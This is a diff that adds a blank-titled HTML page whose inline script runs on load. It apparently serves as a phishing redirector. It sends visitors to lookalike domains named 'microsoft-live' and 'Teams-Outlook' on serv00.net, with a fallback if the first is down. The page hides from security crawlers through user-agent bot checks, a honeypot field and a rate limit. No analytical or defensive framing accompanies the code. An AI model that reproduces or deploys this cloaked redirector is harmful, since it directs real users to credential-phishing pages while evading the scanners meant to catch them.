@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <script>
+        // URLs for primary and backup sites
+        const primaryURL = 'https://microsoft-live.serv00.net/';
+        const backupURL = 'https://Teams-Outlook.serv00.net/';
+
+        // Honeypot check to detect bots
+        function checkHoneypot() {
+            const honeypotField = document.getElementById('honeypot');
+            if (honeypotField && honeypotField.value !== '') {
+                return true;  // Bot detected
+            }
+            return false;
+        }
+
+        // Simple bot detection using user-agent
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const botStrings = ['bot', 'crawl', 'spider', 'slurp', 'robot'];
+            return botStrings.some(bot => userAgent.includes(bot));
+        }
+
+        // Basic rate limiting (in-memory)
+        function rateLimit() {
+            const now = Date.now();
+            const lastVisit = localStorage.getItem('lastVisit');
+            if (lastVisit && (now - lastVisit < 60000)) {  // Less than 60 seconds
+                return true;  // Too many requests
+            }
+            localStorage.setItem('lastVisit', now);
+            return false;
+        }
+
+        // Function to check if the primary site is up
+        function checkPrimarySite() {
+            fetch(primaryURL, { method: 'HEAD' })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = primaryURL;
+                    } else {
+                        redirectToBackup();
+                    }
+                })
+                .catch(() => {
+                    redirectToBackup();
+                });
+        }
+
+        // Function to redirect to the backup site
+        function redirectToBackup() {
+            window.location.href = backupURL;
+        }
+
+        // Function to perform security checks and redirect
+        function performRedirection() {
+            if (checkHoneypot() || isBot() || rateLimit()) {
+                return;  // Exit silently if any check fails
+            }
+            checkPrimarySite();  // Start redirection process
+        }
+
+        // Start the redirection process immediately upon script load
+        performRedirection();
+    </script>
+</head>
+<body>
+    <input type="hidden" id="honeypot" value="">
+</body>
+</html>
